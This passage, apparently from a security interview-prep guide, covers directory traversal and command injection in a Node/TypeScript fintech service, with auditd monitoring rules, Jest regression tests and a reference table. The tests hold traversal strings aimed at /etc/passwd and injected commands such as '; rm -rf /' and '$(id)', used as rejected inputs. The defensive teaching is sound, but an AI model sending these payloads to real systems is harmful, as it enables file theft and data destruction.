# Attacker gets RCE but cannot exfiltrate data or download additional tools
```

**Control 5 — File integrity monitoring:**
```bash
# AIDE / auditd: detect unexpected file modifications
# Alerts when /app/.env, /etc/passwd, /etc/cron.d/* are modified
auditctl -w /app/.env        -p wa -k config_tamper
auditctl -w /etc/cron.d/     -p wa -k cron_tamper
auditctl -w /etc/passwd      -p wa -k passwd_tamper
auditctl -w /root/.ssh/      -p wa -k ssh_tamper

# Alert fires → incident response trigger even if injection was silent
```

**Q15. How do you write automated tests that verify directory traversal and command injection protections are in place and regress if removed?**
A: Security controls must be tested just like functional features — without tests, they are one accidental config change away from silently disappearing:

```typescript
// Directory traversal regression tests
describe('FileService — directory traversal prevention', () => {
  const traversalPayloads = [
    '../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '....//....//etc/passwd',
    '%252e%252e%252fetc%252fpasswd',   // Double-encoded
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', // Windows separators
    '/etc/passwd',                      // Absolute path
    'valid/../../etc/passwd',           // Mixed valid/traversal
    '\x00../../etc/passwd',             // Null byte
  ];

  traversalPayloads.forEach(payload => {
    it(`should reject traversal payload: ${payload.substring(0, 40)}`, async () => {
      const res = await request(app)
        .get(`/api/files/${encodeURIComponent(payload)}`)
        .set('Authorization', `Bearer ${validToken}`);

      expect(res.status).toBeOneOf([400, 403, 404]);
      // 200 with /etc/passwd content = traversal succeeded = test fails
      expect(res.text).not.toContain('root:x:0:0'); // /etc/passwd content
    });
  });

  it('should serve a legitimately uploaded file', async () => {
    const uploadRes = await request(app)
      .post('/api/files/upload')
      .attach('file', Buffer.from('test content'), 'test.pdf')
      .set('Authorization', `Bearer ${validToken}`);

    const filename = uploadRes.body.filename;

    const res = await request(app)
      .get(`/api/files/${filename}`)
      .set('Authorization', `Bearer ${validToken}`);

    expect(res.status).toBe(200);
  });
});

// Command injection regression tests
describe('MandateService — command injection prevention', () => {
  const injectionPayloads = [
    { field: 'customerName', value: 'Amit; cat /etc/passwd' },
    { field: 'customerName', value: 'Amit`whoami`' },
    { field: 'customerName', value: 'Amit$(id)' },
    { field: 'accountNumber', value: '12345; rm -rf /' },
    { field: 'ifscCode', value: 'HDFC0&&id' },
  ];

  injectionPayloads.forEach(({ field, value }) => {
    it(`should reject injection in ${field}: ${value.substring(0, 30)}`, async () => {
      const validPayload = {
        customerName:  'Amit Kumar',
        accountNumber: '123456789012',
        ifscCode:      'HDFC0001234',
      };

      const res = await request(app)
        .post('/api/nach/generate-mandate')
        .send({ ...validPayload, [field]: value })
        .set('Authorization', `Bearer ${validToken}`);

      expect(res.status).toBe(400); // Validation rejection
      // Must never be 200 with shell command output in body
    });
  });

  it('should generate mandate for valid inputs', async () => {
    const res = await request(app)
      .post('/api/nach/generate-mandate')
      .send({
        customerName:  'Amit Kumar',
        accountNumber: '123456789012',
        ifscCode:      'HDFC0001234',
      })
      .set('Authorization', `Bearer ${validToken}`);

    expect(res.status).toBe(200);
    expect(res.body).toHaveProperty('mandateId');
  });
});
```

## Quick Reference Table

| Aspect | Directory Traversal | Command Injection |
|---|---|---|
| **What is abused** | OS `../` path normalization | Shell metacharacter parsing |
| **Attacker controls** | File path component | Shell command string |
| **Impact** | Read/write arbitrary files | Remote code execution (RCE) |
| **Severity** | High (data exfiltration) | Critical (full server compromise) |
| **Vulnerable API** | `fs.readFile(base + userInput)` | `exec('cmd ' + userInput)` |
| **Primary fix** | `path.resolve()` + prefix check | `execFile()` / `spawn(shell:false)` |
| **Secondary fix** | File ownership DB check | Input format allowlist (regex) |
| **Encoding bypass** | URL-encode `../` as `%2e%2e%2f` | N/A (shell parsing, not path) |
| **Argument variant** | Zip slip (archive entry names) | Argument injection (`--flag`) |
| **Detection signal** | `../` or `%2e%2e` in path params | `;`, `|`, `` ` ``, `$()` in any input |
| **OS-level defense** | Read-only FS, process user | seccomp block `execve`, no egress |
| **Infrastructure** | File ownership in DB, RLS | Network egress restriction |
| **Test signal** | Response contains `/etc/passwd` | Response contains `uid=` / `root` |

**Tip for the interview:** At 5 YOE, both topics are expected to go beyond "sanitize user input." The signal for directory traversal: `path.resolve()` + `startsWith(base + path.sep)` with the trailing separator explained (the partial-prefix match bug) — that detail shows you've implemented it, not just read about it. Know the encoding bypass variants (Q2) and be able to name at least three — `%2e%2e%2f`, double encoding, and null byte. For command injection, the `exec()` vs. `execFile()` distinction (Q8) with the mechanism (`/bin/sh -c` vs. `execve()` directly) is the core answer. Know **argument injection** (Q13) separately — it's the advanced follow-up that catches engineers who only think about metacharacter escaping. In a fintech context, the NACH mandate PDF generation scenario (Q12) and the KYC document upload flow (Q5) are exactly the kinds of real-world contexts you encounter — connecting the vulnerability class to a specific business process you've touched is the strongest answer you can give.
